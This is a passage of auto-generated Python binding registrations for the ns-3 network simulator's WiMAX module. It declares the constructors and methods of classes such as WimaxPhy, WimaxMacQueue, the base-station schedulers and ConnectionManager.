'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
return
def register_Ns3WimaxConnection_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxConnection const &', 'arg0')])
cls.add_constructor([param('ns3::Cid', 'cid'), param('ns3::Cid::Type', 'type')])
cls.add_method('ClearFragmentsQueue',
'void',
[])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])
cls.add_method('FragmentEnqueue',
'void',
[param('ns3::Ptr< ns3::Packet const >', 'fragment')])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetFragmentsQueue',
'std::list< ns3::Ptr< ns3::Packet const > > const',
[],
is_const=True)
cls.add_method('GetQueue',
'ns3::Ptr< ns3::WimaxMacQueue >',
[],
is_const=True)
cls.add_method('GetSchedulingType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[],
is_const=True)
cls.add_method('GetType',
'ns3::Cid::Type',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetTypeStr',
'std::string',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3WimaxMacQueue_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxMacQueue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'maxSize')])
cls.add_method('CheckForFragmentation',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('Dequeue',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])
cls.add_method('GetFirstPacketHdrSize',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetFirstPacketPayloadSize',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetFirstPacketRequiredByte',
'uint32_t',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('GetMaxSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNBytes',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPacketQueue',
'std::deque< ns3::WimaxMacQueue::QueueElement > const &',
[],
is_const=True)
cls.add_method('GetQueueLengthWithMACOverhead',
'uint32_t',
[])
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsEmpty',
'bool',
[],
is_const=True)
cls.add_method('IsEmpty',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::GenericMacHeader &', 'hdr')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::GenericMacHeader &', 'hdr'), param('ns3::Time &', 'timeStamp')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('Peek',
'ns3::Ptr< ns3::Packet >',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('ns3::Time &', 'timeStamp')],
is_const=True)
cls.add_method('SetFragmentNumber',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('SetFragmentOffset',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'offset')])
cls.add_method('SetFragmentation',
'void',
[param('ns3::MacHeaderType::HeaderType', 'packetType')])
cls.add_method('SetMaxSize',
'void',
[param('uint32_t', 'maxSize')])
return
def register_Ns3WimaxMacToMacHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxMacToMacHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint32_t', 'len')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSizeOfLen',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3WimaxPhy_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxPhy const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::WimaxChannel >',
[],
is_const=True)
cls.add_method('GetChannelBandwidth',
'uint32_t',
[],
is_const=True)
cls.add_method('GetChnlSrchTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[],
is_const=True)
cls.add_method('GetFrameDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_const=True)
cls.add_method('GetFrameDurationCode',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameDurationSec',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetGValue',
'double',
[],
is_const=True)
cls.add_method('GetMobility',
'ns3::Ptr< ns3::Object >',
[],
is_virtual=True)
cls.add_method('GetNfft',
'uint16_t',
[],
is_const=True)
cls.add_method('GetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetNrCarriers',
'uint8_t',
[],
is_const=True)
cls.add_method('GetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetPhyType',
'ns3::WimaxPhy::PhyType',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetPsDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetPsPerFrame',
'uint16_t',
[],
is_const=True)
cls.add_method('GetPsPerSymbol',
'uint16_t',
[],
is_const=True)
cls.add_method('GetReceiveCallback',
'ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',
[],
is_const=True)
cls.add_method('GetRtg',
'uint16_t',
[],
is_const=True)
cls.add_method('GetRxFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetSamplingFactor',
'double',
[],
is_const=True)
cls.add_method('GetSamplingFrequency',
'double',
[],
is_const=True)
cls.add_method('GetScanningFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetState',
'ns3::WimaxPhy::PhyState',
[],
is_const=True)
cls.add_method('GetSymbolDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetSymbolsPerFrame',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True)
cls.add_method('GetTtg',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTxFrequency',
'uint64_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('IsDuplex',
'bool',
[],
is_const=True)
cls.add_method('Send',
'void',
[param('ns3::SendParams *', 'params')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetChannelBandwidth',
'void',
[param('uint32_t', 'channelBandwidth')])
cls.add_method('SetDataRates',
'void',
[])
cls.add_method('SetDevice',
'void',
[param('ns3::Ptr< ns3::WimaxNetDevice >', 'device')])
cls.add_method('SetDuplex',
'void',
[param('uint64_t', 'rxFrequency'), param('uint64_t', 'txFrequency')])
cls.add_method('SetFrameDuration',
'void',
[param('ns3::Time', 'frameDuration')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('SetMobility',
'void',
[param('ns3::Ptr< ns3::Object >', 'mobility')],
is_virtual=True)
cls.add_method('SetNrCarriers',
'void',
[param('uint8_t', 'nrCarriers')])
cls.add_method('SetPhyParameters',
'void',
[])
cls.add_method('SetPsDuration',
'void',
[param('ns3::Time', 'psDuration')])
cls.add_method('SetPsPerFrame',
'void',
[param('uint16_t', 'psPerFrame')])
cls.add_method('SetPsPerSymbol',
'void',
[param('uint16_t', 'psPerSymbol')])
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('SetScanningCallback',
'void',
[],
is_const=True)
cls.add_method('SetSimplex',
'void',
[param('uint64_t', 'frequency')])
cls.add_method('SetState',
'void',
[param('ns3::WimaxPhy::PhyState', 'state')])
cls.add_method('SetSymbolDuration',
'void',
[param('ns3::Time', 'symbolDuration')])
cls.add_method('SetSymbolsPerFrame',
'void',
[param('uint32_t', 'symbolsPerFrame')])
cls.add_method('StartScanning',
'void',
[param('uint64_t', 'frequency'), param('ns3::Time', 'timeout'), param('ns3::Callback< void, bool, unsigned long, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoGetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDurationCode',
'uint8_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetGValue',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNfft',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetRtg',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFactor',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFrequency',
'double',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTtg',
'uint16_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoSetDataRates',
'void',
[],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoSetPhyParameters',
'void',
[],
is_pure_virtual=True, visibility='private', is_virtual=True)
return
def register_Ns3AttributeAccessor_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeAccessor const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Get',
'bool',
[param('ns3::ObjectBase const *', 'object'), param('ns3::AttributeValue &', 'attribute')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasGetter',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasSetter',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Set',
'bool',
[param('ns3::ObjectBase *', 'object', transfer_ownership=False), param('ns3::AttributeValue const &', 'value')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3AttributeChecker_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeChecker const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Check',
'bool',
[param('ns3::AttributeValue const &', 'value')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Copy',
'bool',
[param('ns3::AttributeValue const &', 'source'), param('ns3::AttributeValue &', 'destination')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Create',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('CreateValidValue',
'ns3::Ptr< ns3::AttributeValue >',
[param('ns3::AttributeValue const &', 'value')],
is_const=True)
cls.add_method('GetUnderlyingTypeInformation',
'std::string',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetValueTypeName',
'std::string',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('HasUnderlyingTypeInformation',
'bool',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3AttributeValue_methods(root_module, cls):
cls.add_constructor([param('ns3::AttributeValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3BSScheduler_methods(root_module, cls):
cls.add_constructor([param('ns3::BSScheduler const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('CheckForFragmentation',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('int', 'availableSymbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetBs',
'ns3::Ptr< ns3::BaseStationNetDevice >',
[],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetBs',
'void',
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],
is_virtual=True)
return
def register_Ns3BSSchedulerRtps_methods(root_module, cls):
cls.add_constructor([param('ns3::BSSchedulerRtps const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_virtual=True)
cls.add_method('BSSchedulerBEConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerBasicConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerBroadcastConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerInitialRangingConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerNRTPSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerPrimaryConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerRTPSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('BSSchedulerUGSConnection',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('SelectBEConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_virtual=True)
cls.add_method('SelectIRandBCConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectMenagementConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectNRTPSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectRTPSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
cls.add_method('SelectUGSConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])
return
def register_Ns3BSSchedulerSimple_methods(root_module, cls):
cls.add_constructor([param('ns3::BSSchedulerSimple const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddDownlinkBurst',
'void',
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],
is_virtual=True)
cls.add_method('CreateUgsBurst',
'ns3::Ptr< ns3::PacketBurst >',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],
is_virtual=True)
cls.add_method('GetDownlinkBursts',
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('SelectConnection',
'bool',
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],
is_virtual=True)
return
def register_Ns3BandwidthRequestHeader_methods(root_module, cls):
cls.add_constructor([param('ns3::BandwidthRequestHeader const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetBr',
'uint32_t',
[],
is_const=True)
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetEc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHcs',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHt',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetBr',
'void',
[param('uint32_t', 'br')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetEc',
'void',
[param('uint8_t', 'ec')])
cls.add_method('SetHcs',
'void',
[param('uint8_t', 'hcs')])
cls.add_method('SetHt',
'void',
[param('uint8_t', 'HT')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('check_hcs',
'bool',
[],
is_const=True)
return
def register_Ns3BsServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::BsServiceFlowManager const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'device')])
cls.add_method('AddMulticastServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf'), param('ns3::WimaxPhy::ModulationType', 'modulation')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AllocateServiceFlows',
'void',
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetDsaAckTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('uint32_t', 'sfid')],
is_const=True)
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[param('ns3::Cid', 'cid')],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('ProcessDsaAck',
'void',
[param('ns3::DsaAck const &', 'dsaAck'), param('ns3::Cid', 'cid')])
cls.add_method('ProcessDsaReq',
'ns3::ServiceFlow *',
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])
cls.add_method('SetMaxDsaRspRetries',
'void',
[param('uint8_t', 'maxDsaRspRetries')])
return
def register_Ns3CallbackChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackChecker const &', 'arg0')])
return
def register_Ns3CallbackImplBase_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackImplBase const &', 'arg0')])
cls.add_method('IsEqual',
'bool',
[param('ns3::Ptr< ns3::CallbackImplBase const >', 'other')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3CallbackValue_methods(root_module, cls):
cls.add_constructor([param('ns3::CallbackValue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::CallbackBase const &', 'base')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::CallbackBase', 'base')])
return
def register_Ns3Channel_methods(root_module, cls):
cls.add_constructor([param('ns3::Channel const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
return
def register_Ns3ConnectionManager_methods(root_module, cls):
cls.add_constructor([param('ns3::ConnectionManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::Cid::Type', 'type')])
cls.add_method('AllocateManagementConnections',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::RngRsp *', 'rngrsp')])
cls.add_method('CreateConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[param('ns3::Cid::Type', 'type')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[param('ns3::Cid', 'cid')])
cls.add_method('GetConnections',
'std::vector< ns3::Ptr< ns3::WimaxConnection > >',
[param('ns3::Cid::Type', 'type')],
is_const=True)
cls.add_method('GetNPackets',
'uint32_t',
[param('ns3::Cid::Type', 'type'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('SetCidFactory',
'void',
[param('ns3::CidFactory *', 'cidFactory')])
return
def register_Ns3Dcd_methods(root_module, cls):
cls.add_constructor([param('ns3::Dcd const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddDlBurstProfile',
'void',
[param('ns3::OfdmDlBurstProfile', 'dlBurstProfile')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetChannelEncodings',
'ns3::OfdmDcdChannelEncodings',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetDlBurstProfiles',
'std::vector< ns3::OfdmDlBurstProfile >',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetNrDlBurstProfiles',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetChannelEncodings',
'void',
[param('ns3::OfdmDcdChannelEncodings', 'channelEncodings')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'configurationChangeCount')])
